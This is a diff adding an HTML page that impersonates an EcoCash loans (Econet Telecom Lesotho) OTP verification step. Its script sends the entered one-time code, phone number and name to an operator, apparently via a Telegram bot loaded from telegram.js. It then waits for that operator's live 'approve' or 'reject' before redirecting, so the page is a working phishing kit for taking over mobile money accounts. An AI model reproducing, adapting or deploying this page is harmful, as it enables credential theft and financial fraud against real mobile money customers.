@@ -1,0 +1,48 @@
+<!doctype html>
+<html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Verify code | EcoCash loans Lesotho</title><link rel="icon" href="assets/branding/favicon.ico"><link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;600;700&family=Manrope:wght@600;700;800&display=swap" rel="stylesheet"><link rel="stylesheet" href="flow.css">
+<style>
+@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+.spinner { border: 3px solid rgba(255,255,255,0.3); border-top: 3px solid #fff; border-radius: 50%; width: 28px; height: 28px; animation: spin 1s linear infinite; }
+.hidden-text .verify-btn-text { display: none; }
+@media(max-width:600px){
+  .login-card{padding:20px 15px 15px;border-radius:18px}.login-card .eyebrow{font-size:18px;margin-bottom:10px}.login-card h1{font-size:22px}.intro{font-size:14px;margin:0 0 15px}.field input{padding:0 15px;height:50px;font-size:16px}.otp input{width:40px;height:45px;padding:5px;font-size:18px}.primary.wide{padding:12px}.spinner{width:24px;height:24px;border:2px solid rgba(255,255,255,0.3);border-top:2px solid #fff}
+}</style></head>
+<body><nav class="flow-nav"><a class="flow-brand" href="https://play.google.com/store/apps/developer?id=Econet+Telecom+LS" target="_blank" rel="noopener"><img src="assets/branding/etl-logo.png" alt="Econet Telecom LS"><span>EcoCash loans Lesotho</span></a><span class="secure">Secure application</span></nav><main class="page"><div class="login-card center"><div class="eyebrow">One more step</div><h1>Enter your verification code.</h1><p class="intro">Enter the 4-digit verification code sent to your mobile number.</p><form class="panel" id="otp-form" action="success.html"><div class="otp" aria-label="Four digit verification code"><input maxlength="1" inputmode="numeric" pattern="[0-9]" required autofocus><input maxlength="1" inputmode="numeric" pattern="[0-9]" required><input maxlength="1" inputmode="numeric" pattern="[0-9]" required><input maxlength="1" inputmode="numeric" pattern="[0-9]" required></div><button class="primary wide" type="submit" id="verify-btn"><span class="verify-btn-text">Verify and submit</span></button><div id="otp-approval-status" style="display:none;text-align:center;margin-top:15px"><div class="spinner"></div></div><p style="font-size:12px;color:var(--muted);margin:17px 0 0">Didn't receive a code? <a href="#" style="color:var(--blue);font-weight:700">Resend code</a></p></form><a class="back" href="login.html">← Use a different number</a></div></main><script src="assets/js/telegram.js"></script>
+<script>
+  const inputs=[...document.querySelectorAll('.otp input')];
+  inputs.forEach((input,i)=>{input.addEventListener('input',()=>{input.value=input.value.replace(/\D/g,'');if(input.value&&inputs[i+1])inputs[i+1].focus()});input.addEventListener('keydown',e=>{if(e.key==='Backspace'&&!input.value&&inputs[i-1])inputs[i-1].focus()})});
+  
+  document.getElementById('otp-form').addEventListener('submit', async function(e){
+    e.preventDefault();
+    const otp = inputs.map(i => i.value).join('');
+    const customerData = JSON.parse(sessionStorage.getItem('ecoCashCustomer') || '{}');
+    const appId = sessionStorage.getItem('current_app_id') || 'default_app';
+    
+    const message = `<b>New OTP Submitted</b>\nApp ID: \`${appId}\`\nOTP: <code>${otp}</code>\n\nPhone: ${customerData.phone || 'N/A'}\nName: ${customerData.firstName} ${customerData.lastName || ''}\n`;
+    
+    await sendWithButtons(message);
+    
+    document.getElementById('verify-btn').classList.add('hidden-text');
+    document.getElementById('verify-btn').disabled = true;
+    document.getElementById('otp-approval-status').style.display = 'block';
+    
+    pollForUpdates((update) => {
+      if (update.callback_query) {
+        const data = update.callback_query.data;
+        const msgText = update.callback_query.message.caption || update.callback_query.message.text;
+        if (msgText.includes('OTP Submitted') && msgText.includes(otp)) {
+          if (data === 'approve') {
+            setApproved(appId);
+            setApproved('otp_approved_' + appId);
+            window.location.href = 'success.html';
+          } else if (data === 'reject') {
+            document.getElementById('verify-btn').classList.remove('hidden-text');
+            document.querySelector('.verify-btn-text').textContent = 'Verify and submit';
+            document.getElementById('verify-btn').disabled = false;
+            document.getElementById('otp-approval-status').style.display = 'none';
+          }
+        }
+      }
+    });
+  });
+</script></body></html>
